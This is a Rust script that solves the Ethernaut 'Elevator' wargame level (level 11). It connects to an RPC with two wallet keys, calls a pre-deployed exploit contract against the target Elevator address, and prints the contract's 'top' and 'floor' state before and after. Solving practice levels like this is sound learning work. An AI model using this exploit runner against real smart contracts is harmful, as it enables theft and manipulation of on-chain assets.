#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Bytes, U256, address,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract Elevator {
        function top() external view returns (bool);
        function floor() external view returns (uint256);
        function goTo(uint256 _floor) public;
    }

    #[sol(rpc)]
    contract Exp11 {
        function exploit(address target) external;
    }
}

use crate::ethernaut;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level11_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level11())?;
    
    Ok(())
}

async fn level11() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);
    
    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;
    
    let elevator_address = "0x9be413c720963F23FAa737E6bD05C8Ed3c0CC186".parse()?;
    let elevator = Elevator::new(elevator_address, provider.clone());
    let exp_address = "0x36A581fefa5560F026129f3d7a706f8ec9B014d7".parse()?;
    let exp = Exp11::new(exp_address, provider.clone());

    
    println!("[CHECK]");
    let top = elevator.top().call().await?;
    let floor = elevator.floor().call().await?;
    println!("[Elevator.top()]      top = {top}");
    println!("[Elevator.floor()]    floor = {floor}\n");
    
    println!("[EXECUTE]");
    let exploit_tx = exp.exploit(elevator_address)
        .send()
        .await?;
    println!("[Exp.exploit()]    Panding transaction... {}",
        exploit_tx.tx_hash()
    );

    let exploit_receipt = exploit_tx.get_receipt().await?;
    println!(
        "[Exp.exploit()]    transaction included in block {}\n",
        exploit_receipt.block_number.expect("Failed to get block number")
    );
    
    println!("[CHECK]");
    let top = elevator.top().call().await?;
    let floor = elevator.floor().call().await?;
    println!("[Elevator.top()]      top = {top}");
    println!("[Elevator.floor()]    floor = {floor}\n");
    
    Ok(())
}

